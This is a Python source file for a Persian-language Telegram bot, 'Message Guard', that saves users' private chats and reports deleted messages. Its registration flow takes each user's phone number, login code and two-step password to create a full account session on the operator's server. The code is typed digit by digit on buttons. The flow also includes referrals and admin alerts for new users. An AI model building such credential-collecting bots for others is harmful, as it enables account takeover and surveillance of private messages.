from __future__ import annotations

import asyncio
import logging
from pathlib import Path

from aiogram import F, Router
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.types import Message
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker
from telethon.errors import (
    FloodWaitError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
)

from app.bot.access import get_own_account
from app.bot.admin_notify import notify_super_admin_new_user
from app.bot.concurrency import AUTH_SEMAPHORE, user_registration_lock
from app.bot.keyboards import (
    code_entry_keyboard,
    main_menu_keyboard,
    registered_menu_keyboard,
    remove_keyboard,
    share_phone_keyboard,
    unregister_confirm_keyboard,
)
from app.bot.messages import (
    CODE_PRIVACY_NOTE,
    PRIVACY_BANNER,
    PRIVACY_SHORT,
    REGISTRATION_WARNING,
    SESSION_CANCELLED,
    UNREGISTER_WARNING,
)
from app.bot.security import delete_sensitive_message
from app.bot.service_context import ServiceContext
from app.config import AppConfig
from app.db.models import Account
from app.modules.registration.states import RegistrationStates, UnregisterStates
from app.repositories.account_repo import AccountRepository
from app.services.account_lifecycle import delete_account
from app.telegram.auth import normalize_phone, register_account_via_bot, request_login_code

logger = logging.getLogger(__name__)
router = Router()

CODE_DIGITS = frozenset("0123456789")
CODE_BACK = "⌫"
CODE_SUBMIT = "✅"
CODE_CANCEL = "❌ لغو ثبت‌نام"
CODE_MAX_LENGTH = 6
CODE_AUTO_SUBMIT_LENGTH = 5

CODE_REQUEST_MESSAGE = (
    "📨 کد تأیید به تلگرام شما ارسال شد.\n\n"
    "⚠️ <b>مهم — فقط سرور شخصی:</b>\n"
    "• این کد فقط برای ساخت سشن روی <b>سرور خودتان</b> است\n"
    "• <b>هیچ پیامی تایپ نکنید</b> — فقط از دکمه‌های پایین استفاده کنید\n"
    "• ارقام کد را به ترتیب از دکمه‌ها بزنید\n"
    "• کد در چت نمایش داده نمی‌شود\n"
    "• به هیچ‌کس ندهید\n\n"
    "پیشرفت: {progress}"
    + CODE_PRIVACY_NOTE
)


def _code_progress(length: int) -> str:
    filled = "●" * length
    empty = "○" * max(0, CODE_AUTO_SUBMIT_LENGTH - length)
    return filled + empty


def _code_prompt_text(length: int) -> str:
    return CODE_REQUEST_MESSAGE.format(progress=_code_progress(length))


def _pending_session_path(config: AppConfig, user_id: int) -> str:
    return str(config.sessions_dir / f"_pending_bot_{user_id}")


def _cleanup_pending_session(session_path: str) -> None:
    for suffix in (".session", ".session-journal"):
        pending_file = Path(f"{session_path}{suffix}")
        if pending_file.exists():
            pending_file.unlink()


async def _begin_phone_verification(
    message: Message,
    state: FSMContext,
    *,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
    phone: str,
) -> None:
    async with session_factory() as db:
        existing = await get_own_account(AccountRepository(db), message.from_user.id)
    if existing:
        await message.answer("شما قبلاً ثبت‌نام کرده‌اید.", reply_markup=registered_menu_keyboard())
        await state.clear()
        return

    phone = normalize_phone(phone)
    session_path = _pending_session_path(config, message.from_user.id)
    Path(session_path).parent.mkdir(parents=True, exist_ok=True)
    _cleanup_pending_session(session_path)

    lock = user_registration_lock(message.from_user.id)
    if lock.locked():
        await message.answer("⏳ ثبت‌نام شما در حال انجام است. لطفاً صبر کنید.")
        return

    async with lock:
        try:
            async with AUTH_SEMAPHORE:
                phone_code_hash = await request_login_code(config, session_path, phone)
        except ConnectionError:
            logger.exception("Telegram connection failed for user_id=%s", message.from_user.id)
            _cleanup_pending_session(session_path)
            await message.answer(
                "❌ اتصال به تلگرام برقرار نشد. لطفاً چند دقیقه بعد دوباره تلاش کنید.",
                reply_markup=main_menu_keyboard(),
            )
            await state.clear()
            return
        except FloodWaitError as exc:
            logger.warning("FloodWait for user_id=%s: %s seconds", message.from_user.id, exc.seconds)
            _cleanup_pending_session(session_path)
            minutes = max(1, exc.seconds // 60)
            await message.answer(
                f"⏳ تلگرام درخواست موقت محدود کرده. لطفاً حدود {minutes} دقیقه بعد دوباره تلاش کنید.",
                reply_markup=main_menu_keyboard(),
            )
            await state.clear()
            return
        except Exception:
            logger.exception("Failed to send login code to user_id=%s", message.from_user.id)
            _cleanup_pending_session(session_path)
            await message.answer(
                "❌ ارسال کد با خطا مواجه شد. لطفاً چند دقیقه بعد دوباره تلاش کنید.",
                reply_markup=main_menu_keyboard(),
            )
            await state.clear()
            return

    await state.update_data(
        phone=phone,
        phone_code_hash=phone_code_hash,
        session_path=session_path,
        partial_code="",
    )
    await state.set_state(RegistrationStates.waiting_code)
    prompt = await message.answer(
        _code_prompt_text(0),
        reply_markup=code_entry_keyboard(),
    )
    await state.update_data(code_prompt_message_id=prompt.message_id)


async def _update_code_prompt(message: Message, state: FSMContext, *, length: int) -> None:
    data = await state.get_data()
    prompt_id = data.get("code_prompt_message_id")
    text = _code_prompt_text(length)
    if prompt_id:
        try:
            await message.bot.edit_message_text(
                text,
                chat_id=message.chat.id,
                message_id=prompt_id,
            )
            return
        except Exception:
            pass
    prompt = await message.answer(text, reply_markup=code_entry_keyboard())
    await state.update_data(code_prompt_message_id=prompt.message_id)


async def _complete_registration(
    message: Message,
    state: FSMContext,
    *,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
    service_context: ServiceContext | None,
    code: str,
    password: str | None = None,
) -> None:
    user_id = message.from_user.id
    lock = user_registration_lock(user_id)

    if lock.locked():
        await message.answer("⏳ ثبت‌نام شما در حال انجام است. لطفاً صبر کنید.")
        return

    async with lock:
        data = await state.get_data()
        phone = data.get("phone")
        phone_code_hash = data.get("phone_code_hash")
        session_path = data.get("session_path")
        referred_by = data.get("referred_by")

        if not phone or not phone_code_hash or not session_path:
            await state.clear()
            await message.answer(
                "⏱ نشست ثبت‌نام منقضی شده. لطفاً دوباره از «ثبت‌نام» شروع کنید.",
                reply_markup=main_menu_keyboard(),
            )
            return

        try:
            async with AUTH_SEMAPHORE:
                async with session_factory() as db:
                    account = await register_account_via_bot(
                        config,
                        db,
                        session_path=session_path,
                        phone=phone,
                        code=code,
                        phone_code_hash=phone_code_hash,
                        bot_chat_id=user_id,
                        referred_by=referred_by,
                        password=password,
                    )
        except SessionPasswordNeededError:
            await state.update_data(code=code)
            await state.set_state(RegistrationStates.waiting_password)
            await delete_sensitive_message(message)
            await message.answer(
                "🔐 رمز دو مرحله‌ای (2FA) اکانت شما فعال است.\n"
                "لطفاً رمز خود را ارسال کنید:\n\n"
                "⚠️ فقط اگر این ربات روی سرور شخصی شماست، رمز را وارد کنید.\n"
                "برای لغو: «❌ لغو ثبت‌نام»",
                reply_markup=remove_keyboard(),
            )
            return
        except PhoneCodeInvalidError:
            await state.update_data(partial_code="")
            await message.answer(
                "❌ کد وارد شده اشتباه است. دوباره از دکمه‌ها وارد کنید.",
                reply_markup=code_entry_keyboard(),
            )
            await _update_code_prompt(message, state, length=0)
            return
        except PhoneCodeExpiredError:
            _cleanup_pending_session(session_path)
            await state.clear()
            await message.answer(
                "⏱ کد منقضی شده. لطفاً دوباره ثبت‌نام کنید.",
                reply_markup=main_menu_keyboard(),
            )
            return
        except ValueError as exc:
            _cleanup_pending_session(session_path)
            await state.clear()
            await message.answer(f"❌ {exc}", reply_markup=main_menu_keyboard())
            return
        except Exception:
            logger.exception("Registration failed for user_id=%s", user_id)
            _cleanup_pending_session(session_path)
            await state.clear()
            await message.answer(
                "❌ ثبت‌نام با خطا مواجه شد. لطفاً بعداً دوباره تلاش کنید.",
                reply_markup=main_menu_keyboard(),
            )
            return

        await delete_sensitive_message(message)
        await state.clear()
        referral = account.referral_code or "-"
        await message.answer(
            "✅ ثبت‌نام با موفقیت انجام شد!\n\n"
            "🔒 سشن شما فقط روی <b>سرور شخصی</b> این ربات ذخیره شده است.\n\n"
            "از این پس اگر کسی پیام خصوصی‌تان را حذف کند، "
            "متن آن همین‌جا برایتان ارسال می‌شود.\n\n"
            f"🎁 کد معرف شما: <code>{referral}</code>\n"
            "می‌توانید این کد را به دوستانتان بدهید.",
            reply_markup=registered_menu_keyboard(),
            protect_content=True,
        )
        asyncio.create_task(notify_super_admin_new_user(message.bot, config, account))

        if service_context is not None:
            try:
                await service_context.on_new_account(account)
            except Exception:
                logger.exception("Failed to start monitoring for account id=%s", account.id)


async def _cancel_registration_flow(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    session_path = data.get("session_path")
    if session_path:
        _cleanup_pending_session(session_path)
    await state.clear()
    await message.answer(SESSION_CANCELLED, reply_markup=main_menu_keyboard())


@router.message(CommandStart())
async def cmd_start(
    message: Message,
    state: FSMContext,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    await state.clear()
    async with session_factory() as db:
        existing = await get_own_account(AccountRepository(db), message.from_user.id)

    if existing:
        referral = existing.referral_code or "-"
        await message.answer(
            "👋 سلام! شما قبلاً ثبت‌نام کرده‌اید.\n\n"
            f"{PRIVACY_SHORT}\n\n"
            "از این پس اگر کسی پیام خصوصی‌تان را حذف کند، "
            "متن آن همین‌جا برایتان ارسال می‌شود.\n\n"
            f"🎁 کد معرف شما: <code>{referral}</code>",
            reply_markup=registered_menu_keyboard(),
            protect_content=True,
        )
        return

    await message.answer(
        "👋 به Message Guard خوش آمدید!\n\n"
        f"{PRIVACY_BANNER}\n\n"
        "این سرویس پیام‌های خصوصی شما را ذخیره می‌کند و "
        "اگر طرف مقابل پیامی را حذف کند، همان‌جا به شما اطلاع می‌دهد.\n\n"
        "برای شروع، روی «ثبت‌نام» بزنید.",
        reply_markup=main_menu_keyboard(),
    )


@router.message(F.text == "📝 ثبت‌نام")
async def start_registration(
    message: Message,
    state: FSMContext,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    async with session_factory() as db:
        existing = await get_own_account(AccountRepository(db), message.from_user.id)
    if existing:
        await message.answer("شما قبلاً ثبت‌نام کرده‌اید.", reply_markup=registered_menu_keyboard())
        return

    await state.set_state(RegistrationStates.waiting_phone)
    await message.answer(REGISTRATION_WARNING, reply_markup=share_phone_keyboard())


@router.message(F.text == "🎁 کد معرف من")
async def show_my_referral_code(
    message: Message,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    async with session_factory() as db:
        existing = await get_own_account(AccountRepository(db), message.from_user.id)
    if not existing:
        await message.answer("ابتدا ثبت‌نام کنید.", reply_markup=main_menu_keyboard())
        return

    referral = existing.referral_code or "-"
    await message.answer(
        f"🎁 کد معرف شما: <code>{referral}</code>\n"
        "می‌توانید این کد را به دوستانتان بدهید.",
        reply_markup=registered_menu_keyboard(),
        protect_content=True,
    )


@router.message(F.text == "🎁 کد معرف دارم")
async def ask_referral_code(message: Message, state: FSMContext) -> None:
    await state.set_state(RegistrationStates.waiting_referral_code)
    await message.answer(
        "🎁 کد معرف خود را وارد کنید:\n\n"
        f"{PRIVACY_SHORT}\n\n"
        "برای لغو: «❌ لغو ثبت‌نام»",
        reply_markup=main_menu_keyboard(),
    )


@router.message(F.text == "🚪 لغو ثبت‌نام")
async def start_unregister(
    message: Message,
    state: FSMContext,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    async with session_factory() as db:
        existing = await get_own_account(AccountRepository(db), message.from_user.id)
    if not existing:
        await message.answer("شما ثبت‌نام نکرده‌اید.", reply_markup=main_menu_keyboard())
        return

    await state.set_state(UnregisterStates.waiting_confirm)
    await message.answer(UNREGISTER_WARNING, reply_markup=unregister_confirm_keyboard())


@router.message(UnregisterStates.waiting_confirm, F.text == "✅ بله، حذف شود")
async def confirm_unregister(
    message: Message,
    state: FSMContext,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
    service_context: ServiceContext | None = None,
) -> None:
    async with session_factory() as db:
        existing = await get_own_account(AccountRepository(db), message.from_user.id)
        if not existing:
            await state.clear()
            await message.answer("حسابی یافت نشد.", reply_markup=main_menu_keyboard())
            return

        pool = service_context.pool if service_context else None
        deleted = await delete_account(config, db, existing.id, pool=pool)

    await state.clear()
    if deleted:
        await message.answer(
            "✅ ثبت‌نام شما لغو شد.\n"
            "سشن از سرور حذف و مانیتورینگ متوقف شد.\n\n"
            f"{PRIVACY_SHORT}",
            reply_markup=main_menu_keyboard(),
        )
    else:
        await message.answer(
            "خطا در حذف حساب. لطفاً با ادمین تماس بگیرید.",
            reply_markup=main_menu_keyboard(),
        )


@router.message(UnregisterStates.waiting_confirm, F.text == "❌ خیر، انصراف")
async def cancel_unregister(message: Message, state: FSMContext) -> None:
    await state.clear()
    await message.answer("عملیات لغو شد.", reply_markup=registered_menu_keyboard())


@router.message(RegistrationStates.waiting_referral_code, F.text == "❌ لغو ثبت‌نام")
async def cancel_referral_registration(message: Message, state: FSMContext) -> None:
    await _cancel_registration_flow(message, state)


@router.message(RegistrationStates.waiting_referral_code)
async def receive_referral_code(
    message: Message,
    state: FSMContext,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    code = (message.text or "").strip().upper()
    if not code:
        await message.answer("لطفاً یک کد معرف معتبر وارد کنید.")
        return

    async with session_factory() as db:
        referrer = await AccountRepository(db).get_by_referral_code(code)

    if not referrer:
        await message.answer("❌ کد معرف پیدا نشد. دوباره تلاش کنید یا بدون کد معرف ثبت‌نام کنید.")
        return

    await state.update_data(referred_by=code)
    await state.set_state(RegistrationStates.waiting_phone)
    await message.answer(
        "✅ کد معرف ثبت شد.\n\n" + REGISTRATION_WARNING,
        reply_markup=share_phone_keyboard(),
    )


@router.message(RegistrationStates.waiting_phone, F.contact)
async def receive_phone_contact(
    message: Message,
    state: FSMContext,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    contact = message.contact
    if not contact or contact.user_id != message.from_user.id:
        await message.answer("❌ فقط شماره تماس خودتان را ارسال کنید.")
        return

    await _begin_phone_verification(
        message,
        state,
        config=config,
        session_factory=session_factory,
        phone=contact.phone_number,
    )


@router.message(RegistrationStates.waiting_phone, F.text == "❌ لغو ثبت‌نام")
async def cancel_registration(message: Message, state: FSMContext) -> None:
    await _cancel_registration_flow(message, state)


@router.message(RegistrationStates.waiting_phone, F.text)
async def receive_phone_text(
    message: Message,
    state: FSMContext,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
) -> None:
    text = (message.text or "").strip()
    digits = text.replace("+", "").replace(" ", "").replace("-", "")
    if not digits.isdigit() or len(digits) < 10:
        await message.answer(
            "❌ شماره نامعتبر است.\n"
            "مثال: <code>09123456789</code> یا <code>+989123456789</code>\n\n"
            "یا از دکمه «اشتراک شماره تماس» استفاده کنید.",
            reply_markup=share_phone_keyboard(),
        )
        return

    await _begin_phone_verification(
        message,
        state,
        config=config,
        session_factory=session_factory,
        phone=text,
    )


@router.message(RegistrationStates.waiting_phone)
async def waiting_phone_invalid(message: Message) -> None:
    await message.answer(
        "لطفاً شماره خود را ارسال کنید:\n"
        "• با دکمه «اشتراک شماره تماس»\n"
        "• یا تایپ کنید (مثلاً <code>09123456789</code>)",
        reply_markup=share_phone_keyboard(),
    )


@router.message(RegistrationStates.waiting_code)
async def receive_verification_code(
    message: Message,
    state: FSMContext,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
    service_context: ServiceContext | None = None,
) -> None:
    text = (message.text or "").strip()

    if text in CODE_DIGITS or text in {CODE_BACK, CODE_SUBMIT, CODE_CANCEL}:
        await delete_sensitive_message(message)

    if text == CODE_CANCEL:
        await _cancel_registration_flow(message, state)
        return

    data = await state.get_data()
    partial = data.get("partial_code", "")

    if text == CODE_BACK:
        partial = partial[:-1]
    elif text in CODE_DIGITS:
        if len(partial) < CODE_MAX_LENGTH:
            partial += text
    elif text == CODE_SUBMIT:
        if not partial:
            await message.answer(
                "⚠️ ابتدا ارقام کد را از دکمه‌ها وارد کنید.",
                reply_markup=code_entry_keyboard(),
            )
            return
        await _complete_registration(
            message,
            state,
            config=config,
            session_factory=session_factory,
            service_context=service_context,
            code=partial,
        )
        return
    else:
        await delete_sensitive_message(message)
        await message.answer(
            "⚠️ <b>هیچ پیامی تایپ نکنید.</b>\n"
            "فقط ارقام کد را به ترتیب از دکمه‌های پایین بزنید.",
            reply_markup=code_entry_keyboard(),
        )
        return

    await state.update_data(partial_code=partial)
    await _update_code_prompt(message, state, length=len(partial))

    if len(partial) >= CODE_AUTO_SUBMIT_LENGTH:
        await _complete_registration(
            message,
            state,
            config=config,
            session_factory=session_factory,
            service_context=service_context,
            code=partial,
        )


@router.message(RegistrationStates.waiting_password, F.text == "❌ لغو ثبت‌نام")
async def cancel_password_step(message: Message, state: FSMContext) -> None:
    data = await state.get_data()
    session_path = data.get("session_path")
    if session_path:
        _cleanup_pending_session(session_path)
    await _cancel_registration_flow(message, state)


@router.message(RegistrationStates.waiting_password)
async def receive_password(
    message: Message,
    state: FSMContext,
    config: AppConfig,
    session_factory: async_sessionmaker[AsyncSession],
    service_context: ServiceContext | None = None,
) -> None:
    password = (message.text or "").strip()
    if not password:
        await message.answer("لطفاً رمز دو مرحله‌ای خود را ارسال کنید.")
        return

    data = await state.get_data()
    code = data.get("code")
    if not code:
        await state.clear()
        await message.answer(
            "⏱ نشست ثبت‌نام منقضی شده. لطفاً دوباره ثبت‌نام کنید.",
            reply_markup=main_menu_keyboard(),
        )
        return

    await _complete_registration(
        message,
        state,
        config=config,
        session_factory=session_factory,
        service_context=service_context,
        code=code,
        password=password,
    )
